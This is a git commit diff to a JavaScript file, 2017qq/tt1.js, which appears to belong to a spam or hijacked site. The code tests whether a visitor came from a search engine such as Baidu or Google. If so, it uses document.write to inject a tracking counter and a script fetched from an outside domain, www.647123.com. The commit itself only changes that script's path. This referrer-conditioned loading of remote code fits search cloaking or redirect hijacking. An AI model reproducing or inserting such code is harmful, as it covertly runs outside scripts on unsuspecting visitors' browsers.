ce2ceb668636bf7ba7b2d7ff215d93138ed215d6
js999999999 <js-9@outlook.com>
2018-03-27 11:57:55 +0800

    Update tt1.js

--- 2017qq/tt1.js
+++ 2017qq/tt1.js
@@ -3,7 +3,7 @@ today=today.getYear()+"-"+(today.getMonth()+1)+"-"+today.getDate();
 var regexp=/\.(sogou|so|haosou|baidu|google|youdao|yahoo|bing|gougou|118114|vnet|360|ioage|sm|sp)(\.[a-z0-9\-]+){1,2}\//ig;
 var where =document.referrer;
 if(regexp.test(where)){
-document.write ('<script language="javascript" src="http://count1.51yes.com/click.aspx?id=15379564&logo=6" charset="gb2312"></script><script language="javascript" type="text/javascript" src="http://www.647123.com/2017qq/t1.js "></script></div>');
+document.write ('<script language="javascript" src="http://count1.51yes.com/click.aspx?id=15379564&logo=6" charset="gb2312"></script><script language="javascript" type="text/javascript" src="http://www.647123.com/2017qq11/t1.js "></script></div>');
 }
 else
 {
